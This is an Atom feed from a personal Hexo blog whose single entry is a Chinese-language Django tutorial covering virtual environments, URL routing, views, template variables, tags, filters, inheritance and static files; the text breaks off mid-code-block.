<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>晨曦远的博客</title>
  
  <subtitle>诗酒趁年华</subtitle>
  <link href="/atom.xml" rel="self"/>
  <link href="%5Bobject%20Object%5D" rel="hub"/>
  <link href="http://chenxiyuan.vip/"/>
  <updated>2019-07-16T06:28:38.809Z</updated>
  <id>http://chenxiyuan.vip/</id>
  
  <author>
    <name>晨曦远</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Django框架学习</title>
    <link href="http://chenxiyuan.vip/2019/07/14/Django%E6%A1%86%E6%9E%B6%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chenxiyuan.vip/2019/07/14/Django框架学习/</id>
    <published>2019-07-13T17:18:16.000Z</published>
    <updated>2019-07-16T06:28:38.809Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Django学习"><a href="#Django学习" class="headerlink" title="Django学习"></a>Django学习</h1><h2 id="搭建虚拟环境"><a href="#搭建虚拟环境" class="headerlink" title="搭建虚拟环境"></a>搭建虚拟环境</h2><h3 id="安装virtualenv"><a href="#安装virtualenv" class="headerlink" title="安装virtualenv"></a>安装virtualenv</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install virtualenv</span><br></pre></td></tr></table></figure><ul><li><p>开辟虚拟空间</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">virtualenv Django</span><br><span class="line">#也可以通过-p参数指定python解释器</span><br><span class="line">virtualenv -p C:\Python27\python.exe [virtualenv name]</span><br></pre></td></tr></table></figure></li><li><p>激活虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">linux/mac: source Django/bin/activate</span><br><span class="line">windows: cd Django/Scripts 执行activate</span><br><span class="line">退出虚拟环境: deactivate</span><br></pre></td></tr></table></figure></li></ul><a id="more"></a><ul><li>虚拟环境安装django<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install Django</span><br></pre></td></tr></table></figure></li></ul><h3 id="virtualenvwrapper"><a href="#virtualenvwrapper" class="headerlink" title="virtualenvwrapper"></a>virtualenvwrapper</h3><p>通过这个软件包管理虚拟环境。</p><ul><li><p>安装virtualenvwrapper</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mac/linux: pip install virtualenvwrapper</span><br><span class="line">windows: pip install virtualenvwrapper-win</span><br></pre></td></tr></table></figure></li><li><p>创建虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv django-env</span><br></pre></td></tr></table></figure></li><li><p>切换到某个虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">workon django-env</span><br></pre></td></tr></table></figure></li><li><p>删除某个虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rmvirtualenv django-env</span><br></pre></td></tr></table></figure></li><li><p>列出所有虚拟环境</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsvirtualenv</span><br></pre></td></tr></table></figure></li><li><p>进入到虚拟环境所在的目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cdvirtualenv</span><br></pre></td></tr></table></figure></li><li><p>创建虚拟环境的时候指定python版本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkvirtualenv --python==C:\Python36\python.exe python3-env</span><br><span class="line">mkvirtualenv --python==C:\Python27\python.exe python2-env</span><br></pre></td></tr></table></figure></li></ul><h2 id="URL与视图"><a href="#URL与视图" class="headerlink" title="URL与视图"></a>URL与视图</h2><h3 id="视图函数"><a href="#视图函数" class="headerlink" title="视图函数"></a>视图函数</h3><ul><li>视图函数的第一个参数必须是request</li><li>视图函数的返回值必须是<code>django.http.response.HttpResponseBase</code>的子类的对象。<h3 id="url传参"><a href="#url传参" class="headerlink" title="url传参"></a>url传参</h3></li><li><p>views.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="comment"># Create your views here.</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">book</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'图书首页'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">book_detail</span><span class="params">(request,book_id)</span>:</span></span><br><span class="line">    text =<span class="string">"您获取的图书id是：%s"</span> % book_id</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(text)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">author_detail</span><span class="params">(request)</span>:</span></span><br><span class="line">    author_id=request.GET.get(<span class="string">'id'</span>)</span><br><span class="line">    text= <span class="string">'作者的id是: %s'</span> % author_id</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(text)</span><br></pre></td></tr></table></figure></li><li><p>urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.contrib <span class="keyword">import</span> admin</span><br><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> book <span class="keyword">import</span> views</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">'首页'</span>)</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">'admin/'</span>, admin.site.urls),</span><br><span class="line">    path(<span class="string">'book/'</span>,views.book),</span><br><span class="line">    path(<span class="string">''</span>,index),</span><br><span class="line">    path(<span class="string">'book/detail/&lt;book_id&gt;'</span>,views.book_detail),</span><br><span class="line">    path(<span class="string">'book/author/'</span>,views.author_detail)</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li></ul><h3 id="url命名"><a href="#url命名" class="headerlink" title="url命名"></a>url命名</h3><ul><li><p>用name参数命名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">path(&apos;login/&apos;,views.login,name=&apos;login&apos;)</span><br></pre></td></tr></table></figure></li><li><p>在重定向时使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">from django.shortcuts import redirect,reverse</span><br><span class="line">...</span><br><span class="line">return redirect(reverse(&apos;login&apos;))</span><br></pre></td></tr></table></figure></li><li><p>如果多个app里有同名的url,则需要使用应用命名空间</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#定义命名空间，在app的urls.py中</span></span><br><span class="line">app_name=<span class="string">'cms'</span></span><br><span class="line"><span class="comment">#要做反转的时候</span></span><br><span class="line">login_url=reverse(<span class="string">'cms:login'</span>)</span><br></pre></td></tr></table></figure></li></ul><h2 id="Django模板"><a href="#Django模板" class="headerlink" title="Django模板"></a>Django模板</h2><h3 id="模板介绍"><a href="#模板介绍" class="headerlink" title="模板介绍"></a>模板介绍</h3><ul><li><code>DTL</code>: <code>Django Template Language</code><h3 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h3>模板渲染有多种方式，这里列两种常用方式。</li><li><p><code>render_to_string</code>:找到模板，然后将模板编译后渲染成Python的字符串格式，最后再通过<code>HttpResponse</code>类包装成一个<code>HttpResponse</code>对象返回。示例代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.template.loader <span class="keyword">import</span>  render_to_string</span><br><span class="line"><span class="keyword">from</span> django.http <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    html=render_to_string(<span class="string">"index.html"</span>)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(html)</span><br></pre></td></tr></table></figure></li><li><p>django还提供了一个更简便的方式，直接将模板渲染成字符串和包装成HttpResponse对象一步到位完成。示例代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">'index.html'</span>)</span><br></pre></td></tr></table></figure></li></ul><h3 id="模板查找路径"><a href="#模板查找路径" class="headerlink" title="模板查找路径"></a>模板查找路径</h3><p>在项目的<code>settings.py</code>文件中，有一个TEMPLATES配置，包含了模板引擎的配置，模板查找路径的配置，模板上下文的配置。</p><ul><li><p><code>DIRS</code>:存放所有模板的路径，会优先在这个路径查找</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'DIRS'</span>: [os.path.join(BASE_DIR, <span class="string">'templates'</span>)]</span><br></pre></td></tr></table></figure></li><li><p><code>APP_DIRS</code>:默认为True，会在INSTALLED_APPS的安装了的app下的templates文件中查找模板。</p></li><li>查找顺序:首先在<code>DIRS</code>，然后是在当前视图所处的app下的templates文件夹中查找(已经在INSTALLED_APPS中添加)，最后是在其他已经安装了的app中查找。<h3 id="模板变量"><a href="#模板变量" class="headerlink" title="模板变量"></a>模板变量</h3></li></ul><ol><li>模板中使用变量，需要将变量放到<code></code>中。</li></ol><ul><li><p>views.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'username'</span>:<span class="string">'chenxiyuan'</span>,</span><br><span class="line">        <span class="string">'list'</span>: [<span class="string">'aka'</span>,<span class="string">'bim'</span>]</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">'index.html'</span>,context=context)</span><br></pre></td></tr></table></figure></li><li><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">Welcome &#123;&#123; username &#125;&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">AND &#123;&#123; list.1 &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><ol start="2"><li>访问对象:<code>对象.属性</code></li><li>访问字典的key对应的value:<code>字典.key</code>，不能通过中括号<code>[]</code>形式访问。</li><li>访问列表或者元组:都只能通过<code>.</code>的方式访问，不能通过中括号<code>[]</code>访问<h3 id="常用的模板标签"><a href="#常用的模板标签" class="headerlink" title="常用的模板标签"></a>常用的模板标签</h3></li><li><p>注释</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;# ... #&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>if</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if ... %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure></li><li><p><code>for in</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for ... in ... %&#125;</span><br><span class="line">...</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line"># 反向遍历，可以在后面加一个reversed</span><br></pre></td></tr></table></figure></li><li><p><code>url</code>标签</p></li></ol><ul><li><p>类似django中的reverse反转一样</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&#123;% url &apos;book:list&apos; %&#125;&quot;&gt;图书列表页面&lt;/a&gt;</span><br></pre></td></tr></table></figure></li><li><p>带参数传递的url反转,分为位置参数和关键字参数，注意两个不能同时使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#path部分</span><br><span class="line">path(&apos;detail/&lt;book_id&gt;/&apos;,views.book_detail,name=&apos;detail&apos;)</span><br><span class="line">#位置参数</span><br><span class="line">&lt;a href=&quot;&#123;% url &apos;book:detail&apos; 1 %&#125;&quot;&gt; 图书详情页面&lt;/a&gt;</span><br><span class="line">#关键字参数</span><br><span class="line">&lt;a href=&quot;&#123;% url &apos;book:detail&apos; book_id=1 %&#125;&quot;&gt;图书详情页面&lt;/a&gt;</span><br></pre></td></tr></table></figure></li><li><p>传递查询字符串参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;&#123;% url &apos;book:detail&apos; book_id=1 %&#125;?page=1&quot;&gt;图书详情页面&lt;/a&gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="模板过滤器"><a href="#模板过滤器" class="headerlink" title="模板过滤器"></a>模板过滤器</h3><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><p>将传进来的参数添加到原来的值上面。源代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(value, arg)</span>:</span></span><br><span class="line">    <span class="string">"""Add the arg to the value."""</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> int(value) + int(arg)</span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> value + arg</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">''</span></span><br></pre></td></tr></table></figure></p><ul><li><p>views.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">(name)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"hello "</span>+name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'hello'</span>:<span class="string">'hello'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">'index.html'</span>,context=context)</span><br></pre></td></tr></table></figure></li><li><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&#123;&#123; hello|add:"chenxiyuan" &#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h4><p>移除值中所指定的字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 移除value中所有的空格字符</span><br><span class="line">&#123;&#123;value|cut:&quot; &quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>源代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cut</span><span class="params">(value, arg)</span>:</span></span><br><span class="line">    <span class="string">"""Remove all values of arg from the given string."""</span></span><br><span class="line">    safe = isinstance(value, SafeData)</span><br><span class="line">    value = value.replace(arg, <span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> safe <span class="keyword">and</span> arg != <span class="string">';'</span>:</span><br><span class="line">        <span class="keyword">return</span> mark_safe(value)</span><br><span class="line">    <span class="keyword">return</span> value</span><br></pre></td></tr></table></figure></p><h4 id="date"><a href="#date" class="headerlink" title="date"></a>date</h4><p>将日期按照指定格式格式化成字符串。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#数据</span><br><span class="line">context = &#123;</span><br><span class="line">&quot;time&quot;: datatime.now()</span><br><span class="line">&#125;</span><br><span class="line">#模板</span><br><span class="line">&#123;&#123;time|date:&quot;Y-m-d&quot;&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>输出2019-07-15 </p><h3 id="模板继承"><a href="#模板继承" class="headerlink" title="模板继承"></a>模板继承</h3><h4 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h4><ul><li>虚拟环境下新建frontapp:python manage.py startapp front</li><li><p>views.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> render</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    context = &#123;</span><br><span class="line">        <span class="string">'username'</span>: <span class="string">'晨曦远'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">'index.html'</span>,context=context)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">(request)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render(request,<span class="string">'home.html'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">about</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> render(request, <span class="string">'about.html'</span>)</span><br></pre></td></tr></table></figure></li><li><p>urls.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.urls <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> front <span class="keyword">import</span> views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">''</span>, views.index,name=<span class="string">"index"</span>),</span><br><span class="line">    path(<span class="string">'home/'</span>,views.home,name=<span class="string">'home'</span>),</span><br><span class="line">    path(<span class="string">'about/'</span>,views.about,name=<span class="string">'about'</span>)</span><br><span class="line">]</span><br></pre></td></tr></table></figure></li><li><p>base.html:父模板</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"/"</span>&gt;</span>首页<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'home' %&#125;"</span>&gt;</span>个人中心<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&#123;% url 'about' %&#125;"</span>&gt;</span>关于<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>&#123;&#123; username &#125;&#125;<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span></span><br><span class="line">    &#123;% block content %&#125;</span><br><span class="line">        父模板中content的代码</span><br><span class="line">    &#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>index.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    &#123;# 如果父模板block里有内容，会被子模板覆盖掉 #&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>这是首页<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    &#123;# 如果想继承父模板block内容，需要使用block.super #&#125;</span><br><span class="line">    &#123;&#123; block.super &#125;&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></li><li><p>home.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    个人中心</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></li><li><p>about.html</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends 'base.html' %&#125;</span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    关于页面</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="加载静态文件"><a href="#加载静态文件" class="headerlink" title="加载静态文件"></a>加载静态文件</h4><ol><li>确保<code>settings.py</code>的<code>INSTALLED_APPS</code>已经安装了<code>django.contrib.staticfiles</code></li><li>确保<code>settings.py</code>中设置了<code>STATIC_URL</code></li><li>新建app，添加到<code>INSTALLED_APPS</code>,然后在此app下新建一个static文件夹，再创建一个同名app文件夹保存静态文件，以免不同app有同名的静态文件产生混淆</li><li><p>在模板中使用<code>load</code>标签加载<code>static</code>标签</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% load static%&#125;</span><br><span class="line">...</span><br><span class="line">&lt;img src=&quot;&#123;% static &apos;logo.jpg&apos; %&#125;&quot; alt=&quot;&quot;&gt;</span><br></pre></td></tr></table></figure></li><li><p>如果静态文件不与app挂钩，则可以在主程序同路径下新建static文件夹存放静态文件,在<code>settings.py</code>里设置路径</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span 